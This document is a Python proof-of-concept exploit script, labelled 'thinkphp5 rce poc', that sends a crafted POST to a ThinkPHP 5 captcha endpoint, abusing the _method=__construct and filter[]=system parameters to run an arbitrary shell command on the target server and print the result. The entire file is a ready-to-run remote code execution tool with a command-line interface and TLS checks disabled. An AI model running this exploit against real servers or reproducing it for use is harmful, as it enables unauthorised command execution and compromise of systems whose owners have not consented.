import argparse
import textwrap

import requests
requests.packages.urllib3.disable_warnings()


def main(url, cmd):
    full_url = f"{url}/index.php?s=captcha"
    headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1",
               "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
               "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9,ja;q=0.8", "Connection": "close",
               "Content-Type": "application/x-www-form-urlencoded"}
    data = {"_method": "__construct", "filter[]": "system", "method": "get", "server[REQUEST_METHOD]": f"{cmd}"}
    try:
        response = requests.post(full_url, headers=headers, data=data, allow_redirects=False, verify=False, timeout=5)
        res = response.text.split("<!DOCTYPE html>")[0]
        print(f"[+]{cmd}命令执行的回显为:\n{res}")
    except Exception:
        print(f"[-]{url}请求失败")


if __name__ == '__main__':
    banner = """ 
     _   _     _       _          _          ____                 
    | |_| |__ (_)_ __ | | ___ __ | |__  _ __| ___|   _ __ ___ ___ 
    | __| '_ \| | '_ \| |/ / '_ \| '_ \| '_ \___ \  | '__/ __/ _ \\
    | |_| | | | | | | |   <| |_) | | | | |_) |__) | | | | (_|  __/
     \__|_| |_|_|_| |_|_|\_\ .__/|_| |_| .__/____/  |_|  \___\___|
                           |_|         |_|  
                                                    version: 0.0.1
                                                     author : mhx
    """
    print(banner)
    parser = argparse.ArgumentParser(description='thinkphp5 rce poc',
                                     formatter_class=argparse.RawDescriptionHelpFormatter,
                                     epilog=textwrap.dedent('''example:
            cve-2022-4334-rce.py -u http://192.168.1.108
            '''))
    parser.add_argument("-u", "--url", dest="url", type=str, help=" example: http://www.mhx.com")
    parser.add_argument("-c", "--cmd", dest="cmd", type=str,default="id", help=" example: whoami")
    args = parser.parse_args()

    main(args.url,args.cmd)